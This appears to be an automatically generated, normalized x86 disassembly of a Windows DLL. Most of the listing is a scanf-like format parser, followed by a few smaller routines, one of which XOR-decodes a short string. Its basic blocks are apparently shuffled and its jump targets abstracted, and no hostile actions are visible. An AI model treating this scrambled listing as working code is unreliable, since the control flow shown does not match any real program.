lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x1a0 ] eax
mov [ ebp - 0x1b0 ] esi
mov [ ebp - 0x1a8 ] ecx
mov [ ebp - 0x1d8 ] 0x15e
mov [ ebp - 0x1d0 ] edi
mov [ ebp - 0x1f0 ] edi
mov [ ebp - 0x194 ] edi
mov [ ebp - 0x1f4 ] edi
cmp esi edi
jne r-xdata
cmp eax edi
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
push ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10032529
leave
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x204 ]
call sub_10051cf5
mov al [ esi ]
mov [ ebp - 0x1a2 ] 0x0
mov [ ebp - 0x18c ] edi
mov [ ebp - 0x1c8 ] edi
test al al
je r-xdata
push eax
call sub_10063a9a
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x1f8 ] 0x0
je r-xdata
movzx eax al
push eax
call sub_10002c6e
pop ecx
test eax eax
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0x1c8 ]
mov eax [ ebp - 0x1fc ]
and [ eax + 0x70 ] 0xfffffffd
mov esi [ ebp - 0x1b0 ]
mov al [ esi ]
cmp al 0x25
jne r-xdata
push [ ebp - 0x1a0 ]
dec [ ebp - 0x18c ]
lea esi [ ebp - 0x18c ]
call sub_10081679
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
mov ebx eax
movzx eax [ esi ]
inc esi
mov [ ebp - 0x194 ] ebx
mov [ ebp - 0x1b0 ] esi
cmp eax ebx
jne r-xdata
cmp [ esi + 0x1 ] al
je r-xdata
mov esi [ ebp - 0x1b0 ]
push [ ebp - 0x1a0 ]
push eax
call sub_10047126
pop ecx
pop ecx
pop ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp ebx 0xffffffff
movzx eax bl
push eax
call sub_1006022e
pop ecx
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
xor edi edi
mov [ ebp - 0x1c4 ] edi
mov [ ebp - 0x1d1 ] 0x0
mov [ ebp - 0x1ac ] edi
mov [ ebp - 0x1c0 ] edi
mov [ ebp - 0x19c ] edi
mov [ ebp - 0x1cc ] edi
mov [ ebp - 0x1a3 ] 0x0
mov [ ebp - 0x1a4 ] 0x0
mov [ ebp - 0x196 ] 0x0
mov [ ebp - 0x18d ] 0x0
mov [ ebp - 0x1a1 ] 0x0
mov [ ebp - 0x195 ] 0x0
mov [ ebp - 0x185 ] 0x1
mov [ ebp - 0x1dc ] edi
inc esi
movzx eax [ esi ]
push eax
call sub_10002c6e
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x1d0 ] 0x1
jne r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_10047126
pop ecx
pop ecx
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
movzx ecx [ esi ]
inc esi
mov [ ebp - 0x1b0 ] esi
cmp ecx eax
jne r-xdata
cmp [ esi + 0x1 ] al
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0x19c ]
inc [ ebp - 0x1c0 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x19c ] eax
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
push [ ebp - 0x1a8 ]
call sub_1001b2d2
pop ecx
cmp [ esi ] 0x25
jne r-xdata
cmp eax 0xffffffff
je r-xdata
dec [ ebp - 0x18c ]
inc esi
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x18d ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1f4 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1c8 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1b0 ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
push [ ebp - 0x1a0 ]
push eax
call sub_10047126
pop ecx
pop ecx
dec [ ebp - 0x185 ]
dec [ ebp - 0x195 ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc esi
movzx ebx [ esi ]
movzx eax bl
push eax
call sub_10001b6d
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x196 ] 0x0
mov [ ebp - 0x1b0 ] esi
jne r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x1f8 ] 0x0
je r-xdata
cmp [ ebp - 0x1a2 ] al
jne r-xdata
mov esi eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x196 ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x1e4 ]
mov ebx [ eax ]
mov [ ebp - 0x1ec ] eax
add eax 0x4
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x1fc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
inc [ ebp - 0x1dc ]
mov esi eax
mov [ ebp - 0x1b8 ] edi
mov [ ebp - 0x1b4 ] edi
jmp r-xdata
inc [ ebp - 0x185 ]
inc [ ebp - 0x195 ]
jmp r-xdata
inc [ ebp - 0x18d ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx edi [ esi ]
or edi 0x20
mov [ ebp - 0x1e8 ] edi
cmp edi 0x6e
je r-xdata
mov al [ esi ]
cmp al 0x53
je r-xdata
cmp [ ebp - 0x195 ] 0x0
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x18d ] 0x0
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x1c0 ]
test ecx ecx
je r-xdata
cmp edi 0x63
je r-xdata
mov [ ebp - 0x195 ] 0x1
mov [ ebp - 0x195 ] 0xff
cmp al 0x43
jne r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x185 ]
jmp r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp [ ebp - 0x19c ] 0x0
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
cmp edi 0x7b
je r-xdata
cmp cl 0x64
je r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
cmp edi 0x6f
jg r-xdata
cmp edi 0x63
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jmp r-xdata
mov ebx [ ebp - 0x1bc ]
mov esi [ ebp - 0x1b0 ]
mov edi [ ebp - 0x1e8 ]
push [ ebp - 0x1a0 ]
lea esi [ ebp - 0x18c ]
call sub_10081679
pop ecx
jmp r-xdata
cmp cl 0x69
je r-xdata
mov esi eax
jmp r-xdata
mov eax edi
sub eax 0x70
je r-xdata
je r-xdata
mov eax [ ebp - 0x1ec ]
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x1ec ] eax
add eax 0x4
mov [ ebp - 0x1e4 ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x1cc ] eax
cmp eax 0x1
jb r-xdata
cmp edi 0x73
je r-xdata
je r-xdata
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
cmp cl 0x6f
je r-xdata
mov [ ebp - 0x185 ] 0x1
sub eax 0x3
je r-xdata
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
cmp edi 0x63
je r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
cmp edi 0x7b
jne r-xdata
cmp cl 0x78
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
cmp edi 0x64
je r-xdata
mov [ ebx ] 0x0
xor eax eax
mov [ ebx ] ax
jmp r-xdata
cmp cl 0x58
jne r-xdata
cmp [ ebp - 0x1dc ] 0x0
je r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
mov esi ebx
je r-xdata
mov [ ebp - 0x1a1 ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] 0x1
jle r-xdata
call sub_1005b670
mov [ eax ] 0xc
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
mov ebx eax
test ecx ecx
je r-xdata
cmp edi 0x63
je r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_10047126
pop ecx
pop ecx
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ esi ]
cmp eax [ ebp - 0x194 ]
jne r-xdata
cmp edi 0x67
jle r-xdata
cmp [ ebp - 0x1a4 ] 0x0
je r-xdata
cmp edi 0x78
je r-xdata
cmp [ ebp - 0x1a4 ] 0x0
je r-xdata
cmp edi 0x78
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
dec [ ebp - 0x1cc ]
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
je r-xdata
dec [ ebp - 0x1a2 ]
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x194 ] 0x2d
jne r-xdata
cmp edi 0x69
je r-xdata
cmp edi 0x46
jne r-xdata
neg [ ebp - 0x1c4 ]
movzx eax bl
push eax
call sub_10052804
pop ecx
test eax eax
je r-xdata
cmp edi 0x70
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
jmp r-xdata
movzx eax bl
push eax
call sub_10052804
pop ecx
test eax eax
je r-xdata
cmp edi 0x70
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp ebx 0x30
jne r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
inc esi
cmp [ esi ] 0x5e
jne r-xdata
mov [ ebp - 0x1a1 ] 0x1
mov [ ebp - 0x1f4 ] 0x1
jmp r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_10047126
pop ecx
pop ecx
mov esi [ ebp - 0x1b0 ]
inc [ ebp - 0x1a2 ]
inc esi
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov eax [ ebp - 0x1ec ]
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ eax ] 0x2d
inc ebx
jmp r-xdata
push 0x64
pop edi
cmp edi 0x6e
jne r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
and [ ebp - 0x1ac ] 0x0
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
shl [ ebp - 0x1c4 ] 0x4
push ebx
call sub_10081643
mov ebx eax
mov eax [ ebp - 0x1c4 ]
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_10001b6d
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
shld ecx eax 0x4
shl eax 0x4
push ebx
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
call sub_10081643
mov ebx eax
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_10001b6d
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x18c ]
cmp eax 0xffffffff
je r-xdata
cmp edi 0x63
je r-xdata
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
mov ebx eax
mov [ ebp - 0x194 ] ebx
cmp bl 0x78
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
mov ebx eax
mov [ ebp - 0x194 ] ebx
test ecx ecx
je r-xdata
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_1007f8f0
add esp 0xc
cmp [ esi ] 0x5d
jne r-xdata
inc esi
mov [ ebp - 0x1a3 ] 0xff
cmp [ ebp - 0x1c0 ] 0x0
jne r-xdata
dec [ ebp - 0x19c ]
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
mov [ ebp - 0x194 ] eax
cmp [ ebp - 0x196 ] 0x0
mov eax [ ebp - 0x18c ]
je r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_10047126
pop ecx
pop ecx
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp edi 0x6f
jne r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_10047126
pop ecx
pop ecx
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp edi 0x6f
jne r-xdata
push [ ebp - 0x1a0 ]
push eax
call sub_10047126
pop ecx
pop ecx
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp edi 0x73
jne r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
cmp [ ebp - 0x1c0 ] 0x0
mov ebx eax
mov [ ebp - 0x194 ] ebx
je r-xdata
cmp bl 0x58
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
mov dl [ ebp - 0x1d1 ]
jmp r-xdata
mov dl 0x5d
inc esi
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
or [ ebp - 0x19c ] 0xffffffff
cmp [ ebp - 0x1dc ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x1c8 ]
mov ebx [ ebp - 0x1bc ]
mov eax [ ebp - 0x1c4 ]
mov eax [ ebp - 0x1c4 ]
imul eax eax 0xa
jmp r-xdata
cmp ebx 0x38
jge r-xdata
push 0x0
push 0xa
push [ ebp - 0x1b4 ]
push [ ebp - 0x1b8 ]
call sub_10082410
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] edx
jmp r-xdata
cmp ebx 0x38
jge r-xdata
inc esi
jmp r-xdata
cmp [ ebp - 0x1cc ] 0x0
je r-xdata
cmp edi 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
inc [ ebp - 0x1c8 ]
cmp [ ebp - 0x1e8 ] 0x63
je r-xdata
push 0x78
sub [ ebp - 0x19c ] 0x2
cmp [ ebp - 0x19c ] 0x1
jge r-xdata
mov [ ebp - 0x1ac ] 0x1
cmp edi 0x78
je r-xdata
mov al [ esi ]
cmp al 0x5d
jne r-xdata
push eax
call sub_10001b6d
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x185 ] 0x0
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov [ ebx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ ebx + 0x4 ] eax
jmp r-xdata
inc [ ebp - 0x1ac ]
cmp [ ebp - 0x1c0 ] 0x0
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x1c4 ] eax
je r-xdata
mov eax [ ebp - 0x1c4 ]
shl eax 0x3
jmp r-xdata
inc [ ebp - 0x1ac ]
lea eax [ ebx - 0x30 ]
cdq
add [ ebp - 0x1b8 ] eax
adc [ ebp - 0x1b4 ] edx
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
shld ecx eax 0x3
shl eax 0x3
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
jmp r-xdata
call sub_1005b670
cmp [ ebp - 0x1a1 ] 0x0
mov [ eax ] 0xc
je r-xdata
cmp [ ebp - 0x1a1 ] 0x0
je r-xdata
movsx edi [ ebp - 0x1a3 ]
xor edx edx
mov ecx eax
and ecx 0x7
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x24 ]
xor ecx edi
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
cmp [ ebp - 0x1a1 ] 0x0
je r-xdata
inc [ ebp - 0x18d ]
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
inc esi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ ebp - 0x1a3 ] al
cmp al [ ebp - 0x194 ]
jne r-xdata
mov [ ebx ] ax
mov [ ebx ] eax
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
xor eax eax
mov [ esi ] ax
jmp r-xdata
mov [ ebx ] al
inc ebx
mov [ ebp - 0x1e0 ] al
movzx eax al
push eax
call sub_1006022e
pop ecx
test eax eax
je r-xdata
mov edi [ ebp - 0x1e8 ]
mov eax [ ebp - 0x1bc ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1bc ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
push 0x30
pop ebx
jmp r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_10047126
pop ecx
pop ecx
push 0x6f
jmp r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
test dl dl
je r-xdata
mov ebx [ ebp - 0x1bc ]
mov edi [ ebp - 0x1e8 ]
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov al [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
inc [ ebp - 0x1ac ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_100815ec
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
lea eax [ ebp - 0x204 ]
push eax
mov eax [ ebp - 0x204 ]
mov [ ebp - 0x1f0 ] 0x3f
push [ eax + 0xac ]
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x1f0 ]
push eax
call sub_1004bc30
mov ax [ ebp - 0x1f0 ]
add esp 0x10
mov [ ebx ] ax
add ebx 0x2
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
mov [ ebp - 0x1df ] al
mov [ ebp - 0x194 ] ebx
pop edi
jmp r-xdata
inc [ ebp - 0x18d ]
mov cl [ esi ]
cmp cl 0x5d
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
mov [ ebp - 0x194 ] eax
movzx eax al
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x194 ] 0x65
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
mov ecx [ ebp - 0x1a8 ]
mov [ ebp - 0x194 ] eax
mov al [ ebp - 0x1a3 ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_100815ec
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x1bc ] ebx
jmp r-xdata
inc esi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_10047126
pop ecx
pop ecx
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp [ ebp - 0x194 ] 0x45
jne r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov [ ebp - 0x185 ] dl
mov dl cl
mov [ ebp - 0x185 ] cl
jmp r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ ebx + eax ] 0x65
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_100815ec
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_10001b6d
pop ecx
test eax eax
jne r-xdata
movzx ecx [ ebp - 0x185 ]
mov eax ecx
and ecx 0x7
mov dl 0x1
shl dl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] dl
xor dl dl
jmp r-xdata
mov al [ ebp - 0x185 ]
sub al dl
movzx edi dl
movzx edx al
cmp dl [ ebp - 0x185 ]
jae r-xdata
mov eax [ ebp - 0x1a8 ]
inc [ ebp - 0x1c8 ]
lea ecx [ ebp - 0x204 ]
push ecx
push eax
push [ ebp - 0x1bc ]
mov [ ebx + eax ] 0x0
movsx eax [ ebp - 0x185 ]
dec eax
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
add esp 0x10
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
mov [ ebp - 0x194 ] eax
cmp eax 0x2d
jne r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov ecx edi
and ecx 0x7
mov eax edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc edi
dec edx
jne r-xdata
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ ebx + eax ] 0x2d
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
call sub_100815ec
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x1a8 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_100815ec
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
mov [ ebp - 0x194 ] eax
movzx eax al
push eax
call sub_10001b6d
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
mov [ ebp - 0x194 ] eax
and [ ebp - 0x19c ] eax
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1a8 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_100815ec
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_10081663
mov [ ebp - 0x194 ] eax
movzx eax al
sub_100715f0
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push esi
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x5f
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0xb
jb r-xdata
xor eax eax
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x6 ] ax
mov [ ebp - 0x68 ] eax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x1c ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jne r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0xe0
call sub_1002f620
mov esi [ ebp - 0x68 ]
call sub_10006970
mov esi eax
mov eax [ ebp - 0x68 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test esi esi
je r-xdata
mov esi [ edi + 0x12c ]
test esi esi
je r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x64 ]
push edx
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x64 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x64 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ esi ]
lea ecx [ ebp - 0x64 ]
push ecx
mov ecx edi
call sub_10018600
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_100716f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x14
sub_10071720
push ebp
mov ebp esp
push 0xffffffff
push sub_100861eb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x44
call sub_1002e3ac
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x8 ]
push eax
call sub_1003ecd0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x18
sub_1007179d
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100684cf
pop ecx
pop ecx
